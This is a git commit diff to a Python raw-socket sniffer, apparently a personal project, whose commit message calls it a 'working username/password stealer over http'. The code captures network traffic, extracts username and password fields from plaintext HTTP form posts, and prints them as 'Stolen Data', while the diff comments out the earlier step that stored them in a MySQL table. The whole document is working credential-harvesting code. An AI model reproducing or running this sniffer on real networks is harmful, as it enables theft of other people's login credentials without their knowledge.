417fec924a268fb35f968e0e1411012f477d91f9
KPHarmon <kade_harmon@yahoo.com>
2019-03-14 01:22:23 -0700

    commented out db, working username/password stealer over http

--- sniffer.py
+++ sniffer.py
@@ -1,17 +1,30 @@
 import socket
 import pymysql
-import dbinfo
+#import dbinfo
 from networking.ethernet import Ethernet
 from networking.ipv4 import IPv4
 from networking.tcp import TCP
 from networking.http import HTTP
 
+def find_between(s, first, last):
+    try:
+        start = s.index(first) + len(first)
+        end = s.index(last, start)
+        return s[start:end]
+    except ValueError:
+        return ""
+
 def main():
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-    db_conn = dbinfo.mysqlconnect()
-    cursor = db_conn.cursor()
-    cursor.execute("DROP TABLE IF EXISTS demo;")
-    cursor.execute("CREATE TABLE demo (id int AUTO_INCREMENT, source varchar(30) NOT NULL, dest varchar(30) NOT NULL, user varchar(255) NOT NULL, pass varchar(255) NOT NULL, PRIMARY KEY (id));")
+#    db_conn = dbinfo.mysqlconnect()
+#    cursor = db_conn.cursor()
+#    cursor.execute("DROP TABLE IF EXISTS demo;")
+#    cursor.execute("CREATE TABLE demo (id int AUTO_INCREMENT, source varchar(30) NOT NULL, dest varchar(30) NOT NULL, user varchar(255) NOT NULL, pass varchar(255) NOT NULL, PRIMARY KEY (id));")
+#    cursor.execute("INSERT INTO demo (source, dest, user, pass) VALUES('127.0.2.8', '255.0.0.8', 'kade', 'password123');")
+#    cursor.execute("SELECT * FROM demo WHERE user='kade';")
+#    db_conn.commit()
+#    result = cursor.fetchone()
+#    print(result)
     i = 0
 
     while True:
@@ -35,26 +48,21 @@ def main():
                         if len(http.data) < 10:
                             continue
                         i += 1
-                        print('PACKET [' + str(i) + ']\n')
-                        print('\t\t   ' + 'Source: {}:{}, Target: {}:{}'.format(ipv4.src, tcp.src_port, ipv4.target, tcp.dest_port))
-                        print('\t\t   ' + 'HTTP Data:')
-                        sub_1 = "uname="
-                        sub_2 = "psw="
-                        sub_3 = "&"
-                        try:
-                            username = str(http.data)[(str(http.data).index(sub_1)+len(sub_1)):str(http.data).index(sub_3)]
-                        except ValueError:
-                            print("\t\t\tNo Credentials Found")
+                        if http.data.find('password=') == -1:
                             continue
-                        try:
-                            password = str(http.data)[(str(http.data).index(sub_2)+len(sub_2)):str(http.data).index(sub_3)]
-                        except ValueError:
-                            print("\t\t\tNo Credentials Found")
-                        cursor.execute("INSERT INTO demo (source, dest, user, pass) VALUES (%s, %s, %s, %s)", (str(ipv4.src), str(ipv4.target), username, password))
-                        db_conn.commit()
-                        http_info = str(http.data).split('\n')
-                        for line in http_info:
-                            print('\t\t\t   ' + str(line))
-    cur.close()
-    db_conn.close()
+                        username = find_between(str(http.data), "username=", "&")
+                        password = find_between(str(http.data), "password=", "&")
+                        if username.isalnum():
+                            print('PACKET [' + str(i) + ']\n')
+                            print('\t\t   ' + 'Source: {}:{}, Target: {}:{}'.format(ipv4.src, tcp.src_port, ipv4.target, tcp.dest_port))
+                            print('\t\t   ' + 'Stolen Data:')
+                            print("\t\t\tUsername: " + username)
+                            print("\t\t\tPassword: " + password)
+#                        cursor.execute("INSERT INTO demo (source, dest, user, pass) VALUES (%s, %s, %s, %s)", (str(ipv4.src), str(ipv4.target), username, password))
+#                        db_conn.commit()
+#                        http_info = str(http.data).split('\n')
+#                        for line in http_info:
+#                            print('\t\t\t   ' + str(line))
+#    cur.close()
+#    db_conn.close()
 main()
